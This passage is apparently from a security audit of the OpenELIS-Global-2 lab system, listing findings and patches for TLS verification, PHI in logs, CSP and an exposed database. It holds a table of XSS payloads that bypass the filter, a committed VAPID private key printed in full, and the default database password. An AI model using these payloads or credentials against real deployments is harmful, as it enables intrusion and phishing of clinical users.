### P1-B3 — Nginx `proxy_ssl_verify off` — Internal TLS Not Verified

**Severity:** Medium (CVSS 5.9)
**File:** `volume/nginx/nginx.conf` (L49–53, L63, L113)
**CWE:** CWE-295 — Improper Certificate Validation

#### Evidence

```OpenELIS-Global-2/volume/nginx/nginx.conf#L49-53
proxy_pass https://oe.openelis.org:8443/api/;
proxy_redirect off;
proxy_ssl_verify off;   // ← Certificate not verified
proxy_ssl_server_name on;
```

Internal Nginx→backend TLS is unauthenticated. An attacker who can inject a
container into the Docker bridge network (or redirect DNS for `oe.openelis.org`
within the bridge) can perform a full man-in-the-middle attack, decrypting all PHI
in transit between the reverse proxy and the application.

#### Patch

```OpenELIS-Global-2/volume/nginx/nginx.conf#L49-53
proxy_pass https://oe.openelis.org:8443/api/;
proxy_redirect off;
proxy_ssl_verify on;                                # CHANGED: was off
proxy_ssl_trusted_certificate /etc/nginx/certs/oe-ca.crt;   # ADD: internal CA
proxy_ssl_server_name on;
```

Mount the internal CA certificate generated by `itechuw/certgen` into the Nginx
container at `/etc/nginx/certs/oe-ca.crt` in `docker-compose.yml`.

---

## P1-C: PHI Data Exposure in Logs

---

### P1-C1 — Hibernate TRACE Logging Writes PHI to Disk by Default

**Severity:** High (CVSS 7.5)
**File:** `src/main/resources/application.properties` (L41–44)
**CWE:** CWE-532 — Information Exposure Through Log Files / HIPAA §164.312(a)(2)(iv)

#### Evidence

```OpenELIS-Global-2/src/main/resources/application.properties#L41-44
spring.jpa.show-sql=true
spring.jpa.properties.hibernate.format_sql=true
logging.level.org.hibernate.SQL=DEBUG
logging.level.org.hibernate.type.descriptor.sql.BasicBinder=TRACE
```

`logging.level.org.hibernate.type.descriptor.sql.BasicBinder=TRACE` causes Hibernate
to log **every bound SQL parameter value** — patient names, DOBs, diagnoses,
test results, national IDs — in plaintext to `/var/lib/openelis-global/logs/openELIS.log`
(up to 100 rolling files retained).

While `volume/properties/common.properties` comments these out for production Docker
deployments, the base `application.properties` file is the effective default when
`common.properties` is not applied. Any direct `java -jar` deployment, integration
test run, or developer environment exposes PHI through this channel.

#### Patch

**`application.properties` — set production-safe defaults:**

```OpenELIS-Global-2/src/main/resources/application.properties#L41-44
# Hibernate Config — production defaults (NEVER enable TRACE/DEBUG in production)
spring.jpa.show-sql=false
spring.jpa.properties.hibernate.format_sql=false
logging.level.org.hibernate.SQL=WARN
logging.level.org.hibernate.type.descriptor.sql.BasicBinder=WARN
```

**Create a separate `application-dev.properties` for developer use:**

```OpenELIS-Global-2/src/main/resources/application-dev.properties#L1-1
# Development profile — enable Hibernate SQL logging for debugging
# NEVER activate this profile in any environment that touches real patient data
spring.jpa.show-sql=true
spring.jpa.properties.hibernate.format_sql=true
logging.level.org.hibernate.SQL=DEBUG
logging.level.org.hibernate.type.descriptor.sql.BasicBinder=TRACE
```

Activate with `--spring.profiles.active=dev` only in local development.

**Add a startup validation check:**

```OpenELIS-Global-2/src/main/java/org/openelisglobal/common/startup/SecurityStartupValidator.java#L1-1
@Component
public class SecurityStartupValidator {

    @Value("${logging.level.org.hibernate.type.descriptor.sql.BasicBinder:WARN}")
    private String hibernateBinderLogLevel;

    @PostConstruct
    public void validateSecuritySettings() {
        if ("TRACE".equalsIgnoreCase(hibernateBinderLogLevel)
                || "DEBUG".equalsIgnoreCase(hibernateBinderLogLevel)) {
            LogEvent.logWarn(this.getClass().getSimpleName(), "validateSecuritySettings",
                "WARNING: Hibernate SQL parameter logging is enabled at "
                + hibernateBinderLogLevel + " level. "
                + "This will write PHI to log files. "
                + "DO NOT run with this setting in any environment with real patient data.");
        }
    }
}
```

---

### P1-C2 — Cleartext Username Logging on Every Auth Event (Duplicate + Enumeration Risk)

**Severity:** Low-Medium (CVSS 4.3)
**Files:**
- `src/main/java/org/openelisglobal/security/login/AuthenticationListener.java` (L14–26)
- `src/main/java/org/openelisglobal/security/login/CustomFormAuthenticationSuccessHandler.java` (L68–79)
**CWE:** CWE-117 — Improper Output Neutralization for Logs / CWE-200 — Information Exposure

#### Evidence

```OpenELIS-Global-2/src/main/java/org/openelisglobal/security/login/AuthenticationListener.java#L14-26
@EventListener
public void onSuccess(AuthenticationSuccessEvent success) {
    LogEvent.logInfo(this.getClass().getSimpleName(), "onSuccess",
            "Successful login attempt for " + success.getAuthentication().getName());
}

@EventListener
public void onFailure(AbstractAuthenticationFailureEvent failures) {
    LogEvent.logInfo(this.getClass().getSimpleName(), "onFailure",
            "Unsuccessful login attempt for " + failures.getAuthentication().getName());
}
```

Both `AuthenticationListener` and `CustomFormAuthenticationSuccessHandler` log the same
authentication events, causing **duplicate log entries** for every login. More critically,
failed login attempts log the **exact username** supplied by the attacker. A brute-force
script cycling through username lists produces a log file that confirms which usernames
are valid (successful log entries) versus invalid (failed entries) — a textbook username
enumeration oracle via log analysis.

#### Patch

**Remove the duplicate logging from `CustomFormAuthenticationSuccessHandler`** (since
`AuthenticationListener` already handles the event via Spring's event system):

```OpenELIS-Global-2/src/main/java/org/openelisglobal/security/login/CustomFormAuthenticationSuccessHandler.java#L68-79
// REMOVE the duplicate log blocks — AuthenticationListener handles these events.
// Keep only the IP resolution logic (with the RemoteIpValve fix from P1-A2):
LogEvent.logInfo(this.getClass().getSimpleName(), "onSuccess",
    "Successful login from " + request.getRemoteAddr());
```

**In `AuthenticationListener`, hash the username for log output:**

```OpenELIS-Global-2/src/main/java/org/openelisglobal/security/login/AuthenticationListener.java#L14-26
@EventListener
public void onSuccess(AuthenticationSuccessEvent success) {
    // Log a one-way hash of the username — preserves audit correlation
    // without leaking valid usernames to log readers
    String hashedUser = DigestUtils.sha256Hex(
        success.getAuthentication().getName().toLowerCase());
    LogEvent.logInfo(this.getClass().getSimpleName(), "onSuccess",
        "Successful login attempt. UserHash=" + hashedUser.substring(0, 12));
}

@EventListener
public void onFailure(AbstractAuthenticationFailureEvent failures) {
    String hashedUser = DigestUtils.sha256Hex(
        failures.getAuthentication().getName().toLowerCase());
    LogEvent.logInfo(this.getClass().getSimpleName(), "onFailure",
        "Unsuccessful login attempt. UserHash=" + hashedUser.substring(0, 12));
}
```

---

## P1-D: VAPID Key Security

---

### P1-D1 — VAPID Private Key Committed to Source Control

**Severity:** High (CVSS 7.5)
**File:** `src/main/resources/application.properties` (L55–56)
**CWE:** CWE-321 — Use of Hard-coded Cryptographic Key / CWE-798 — Use of Hardcoded Credentials

#### Evidence

```OpenELIS-Global-2/src/main/resources/application.properties#L55-56
vapid.public.key=BJDIyXHWK_o9fYNwD3fUie2Ed04-yx5fxz9-GUT1c0QhfdDiGMvVbJwvB_On3XapXqIRR471uh7Snw3bfPt9niw
vapid.private.key=FVONpka44MuWq6U8l3X4HY1hAfWM1v1IQB698gsS0KQ
```

The VAPID **private key** is committed to the repository in plaintext and is visible in
all forks, the full git history, and any clone. With the exposed private key, an attacker
can send push notifications that appear to originate from the legitimate OpenELIS server
to all subscribed users — enabling phishing attacks delivered as trusted OS-level browser
notifications in a clinical environment.

Additionally, the `PushService` is initialised with:

```OpenELIS-Global-2/src/main/java/org/openelisglobal/notifications/rest/NotificationRestController.java#L99-102
PushService pushService = new PushService(env.getProperty("vapid.public.key"),
        env.getProperty("vapid.private.key"), "mailto:your-email@example.com");
```

The contact email `your-email@example.com` is a placeholder, violating the VAPID
specification and risking push service operators blocking this server's notifications.

#### Patch

**Step 1 — Immediately rotate the VAPID key pair** (the committed key is now public):

```OpenELIS-Global-2/src/main/resources/application.properties#L55-56
# REMOVE the hardcoded keys — replace with environment variable references:
vapid.public.key=${VAPID_PUBLIC_KEY:?VAPID_PUBLIC_KEY must be set}
vapid.private.key=${VAPID_PRIVATE_KEY:?VAPID_PRIVATE_KEY must be set}
vapid.contact.email=${VAPID_CONTACT_EMAIL:?VAPID_CONTACT_EMAIL must be set}
```

**Step 2 — Update `NotificationRestController` to use the configurable contact email:**

```OpenELIS-Global-2/src/main/java/org/openelisglobal/notifications/rest/NotificationRestController.java#L99-102
// REPLACE:
// PushService pushService = new PushService(..., "mailto:your-email@example.com");
// WITH:
String contactEmail = env.getProperty("vapid.contact.email");
PushService pushService = new PushService(
    env.getProperty("vapid.public.key"),
    env.getProperty("vapid.private.key"),
    "mailto:" + contactEmail);
```

**Step 3 — Add Docker Compose environment variable stubs:**

```OpenELIS-Global-2/docker-compose.yml#L1-1
# In the oe.openelis.org service environment section, ADD:
# - VAPID_PUBLIC_KEY=${VAPID_PUBLIC_KEY:?Set VAPID_PUBLIC_KEY}
# - VAPID_PRIVATE_KEY=${VAPID_PRIVATE_KEY:?Set VAPID_PRIVATE_KEY}
# - VAPID_CONTACT_EMAIL=${VAPID_CONTACT_EMAIL:?Set VAPID_CONTACT_EMAIL}
```

**Step 4 — Generate a new key pair** and store in Docker secrets or a secrets manager:

```OpenELIS-Global-2/scripts/generate-vapid-keys.sh#L1-1
#!/bin/bash
# Generates a fresh VAPID key pair using web-push CLI
# npm install -g web-push
web-push generate-vapid-keys --json
# Store the output in your secrets manager, NOT in source control
```

---

## P1-E: XSS Defences

---

### P1-E1 — `SecurityFilter` XSS Detection is Trivially Bypassed

**Severity:** High (CVSS 7.2)
**File:** `src/main/java/org/openelisglobal/security/SecurityFilter.java` (L40–57)
**CWE:** CWE-79 — Improper Neutralization of Input During Web Page Generation / CWE-184 — Incomplete Blacklist

#### Evidence

```OpenELIS-Global-2/src/main/java/org/openelisglobal/security/SecurityFilter.java#L40-57
if (paramValue.contains("<script>") || paramValue.contains("</script>")) {
    suspectedAttack = true;
    attackList.add("XSS on " + curParam + ": " + StringUtil.snipToMaxLength(paramValue, 50));
}
```

The filter checks exactly two lowercase string literals. All of the following bypass it:

| Payload | Why it bypasses |
|---------|----------------|
| `<SCRIPT>alert(1)</SCRIPT>` | Case variation — filter does not lowercase |
| `<img src=x onerror=alert(1)>` | No `<script>` tag involved |
| `<svg onload=alert(1)>` | SVG-based event injection |
| `javascript:alert(1)` | Protocol injection in `href`/`src` attributes |
| `"><script>alert(1)</script>` | Attribute breakout |
| `%3Cscript%3E` | URL-encoding (context-dependent) |

The filter only runs on POST requests or URIs containing "Update"/"Save".
GET requests with XSS payloads are never inspected. Worse, the false confidence
this filter creates may lead developers to believe XSS is "handled" and skip
proper output encoding.

#### Patch

**Remove `SecurityFilter` entirely** — it provides negative security value:

```OpenELIS-Global-2/src/main/java/org/openelisglobal/security/SecurityFilter.java#L40-57
// REMOVE the entire filter class and its registration.
// XSS prevention must be done at the correct layer:
//   1. Output encoding (defaultHtmlEscape=true in web.xml — already present)
//   2. Strict CSP (fix P1-F1 first)
//   3. OWASP Java HTML Sanitizer for fields that accept rich content
//   4. Input validation via ValidationHelper for structured fields
```

**Add OWASP Java HTML Sanitizer dependency for any fields that accept HTML content:**

```OpenELIS-Global-2/pom.xml#L1-1
<!-- ADD dependency: -->
<dependency>
    <groupId>com.googlecode.owasp-java-html-sanitizer</groupId>
    <artifactId>owasp-java-html-sanitizer</artifactId>
    <version>20220608.1</version>
</dependency>
```

```OpenELIS-Global-2/src/main/java/org/openelisglobal/common/util/HtmlSanitizer.java#L1-1
// CREATE a shared sanitizer utility:
public final class HtmlSanitizer {
    private static final PolicyFactory POLICY = Sanitizers.FORMATTING.and(Sanitizers.LINKS);

    public static String sanitize(String untrustedHtml) {
        if (untrustedHtml == null) return null;
        return POLICY.sanitize(untrustedHtml);
    }

    private HtmlSanitizer() {}
}
```

---

## P1-F: Content Security Policy

---

### P1-F1 — CSP Contains `unsafe-inline` and `unsafe-eval` — Policy is Ineffective

**Severity:** High (CVSS 6.1)
**File:** `src/main/java/org/openelisglobal/security/SecurityConfig.java` (L111–113)
**CWE:** CWE-693 — Protection Mechanism Failure / CWE-1021 — Improper Restriction of Rendered UI Layers

#### Evidence

```OpenELIS-Global-2/src/main/java/org/openelisglobal/security/SecurityConfig.java#L111-113
private static final String CONTENT_SECURITY_POLICY =
    "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval';"
    + " connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline';"
    + " frame-src *.openlmis.org 'self'; object-src 'self';";
```

`'unsafe-inline'` in `script-src` allows all inline `<script>` blocks and
`onclick`/`onerror` event handlers — the primary XSS payload vectors.
`'unsafe-eval'` allows `eval()`, `Function()`, and `setTimeout(string)`.
Together these directives **completely neutralise the XSS protection** that CSP
is designed to provide.

Additional issues:
- `object-src 'self'` permits Flash/plugin objects from self origin (should be `'none'`)
- `frame-src *.openlmis.org` is a wildcard subdomain trust grant

#### Patch (incremental — React migration required for full fix)

**Immediate wins — no code change required:**

```OpenELIS-Global-2/src/main/java/org/openelisglobal/security/SecurityConfig.java#L111-113
// PHASE 1 immediate hardening (low-risk changes):
private static final String CONTENT_SECURITY_POLICY =
    "default-src 'self'; "
    + "script-src 'self' 'unsafe-inline' 'unsafe-eval'; "  // TODO: remove unsafe-* (requires nonce migration)
    + "connect-src 'self'; "
    + "img-src 'self' data:; "
    + "style-src 'self' 'unsafe-inline'; "
    + "frame-src https://openlmis.org https://*.openlmis.org 'self'; "  // narrowed from *.openlmis.org
    + "object-src 'none'; "    // CHANGED: was 'self' — no Flash/plugins needed
    + "base-uri 'self'; "      // ADD: prevent base tag injection
    + "form-action 'self';";   // ADD: restrict form submission targets
```

**Longer-term (nonce-based CSP for React):** Implement per-request nonces in the
Spring MVC response filter and inject them into the React HTML template. This allows
removing `'unsafe-inline'` entirely once all inline scripts are migrated to nonce-tagged
`<script nonce="...">` tags.

---

## P1-G: Infrastructure Security

---

### P1-G1 — PostgreSQL Port 15432 Directly Exposed to Host Network

**Severity:** High (CVSS 9.1)
**File:** `docker-compose.yml` (L18–22)
**CWE:** CWE-284 — Improper Access Control / CWE-1188 — Insecure Default Initialization

#### Evidence

```OpenELIS-Global-2/docker-compose.yml#L18-22
db.openelis.org:
    container_name: openelisglobal-database
    image: itechuw/openelis-global-2-database:develop
    ports:
        - "15432:5432"    // ← Accessible from any IP on the host
```

```OpenELIS-Global-2/docker-compose.yml#L30-31
environment:
    - DB_PASSWORD=${OE_DB_PASSWORD:-clinlims}
```

Port `15432` is bound to `0.0.0.0`, making the database directly reachable from any
network interface. The default password is `clinlims` — identical to the username —
making this a textbook default-credential attack target for automated scanners.

#### Patch

```OpenELIS-Global-2/docker-compose.yml#L18-22
db.openelis.org:
    container_name: openelisglobal-database
    image: itechuw/openelis-global-2-database:develop
    # REMOVE the ports